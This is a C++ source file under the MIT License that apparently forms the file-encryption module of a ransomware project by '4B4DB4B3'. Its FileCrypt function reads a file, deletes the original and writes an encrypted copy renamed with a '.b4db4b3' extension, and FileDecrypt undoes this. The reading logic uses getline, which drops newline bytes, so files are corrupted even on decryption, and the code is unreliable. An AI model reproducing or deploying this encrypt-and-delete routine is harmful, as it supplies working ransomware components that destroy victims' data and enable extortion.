/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "FileCryptor.h"
#include "Manager.h"

BOOL FileCryptor::FileCrypt(std::string path, std::string key) {
	std::ifstream readf(path, std::ifstream::binary);
	if (readf.is_open()) {
		std::string file_text = "";
		
		std::string tmp;
		while (getline(readf, tmp)) {
			file_text += tmp;
		}
		readf.close();

		if (DeleteFileA(path.c_str())) {
			std::string ciphered_text = Manager::EncryptStr(file_text, key);

			if (ciphered_text != "") {
				std::ofstream newfile(std::string(path + ".b4db4b3"), std::ofstream::binary);
				newfile << ciphered_text;
				newfile.close();

				return TRUE;
			}
		}
	}
	
	return FALSE;
}

BOOL FileCryptor::FileDecrypt(std::string path, std::string key) {
	std::ifstream readf(path, std::ifstream::binary);
	if (readf.is_open()) {
		std::string file_text = "";

		std::string tmp;
		while (getline(readf, tmp)) {
			file_text += tmp;
		}
		readf.close();

		if (DeleteFileA(path.c_str())) {
			std::string deciphered_text = Manager::DecryptStr(file_text, key);

			if (deciphered_text != "") {
				path.replace(path.find(".b4db4b3"), 8, "");
				std::ofstream newfile(std::string(path), std::ofstream::binary);
				newfile << deciphered_text;
				newfile.close();

				return TRUE;
			}
		}
	}

	return FALSE;
}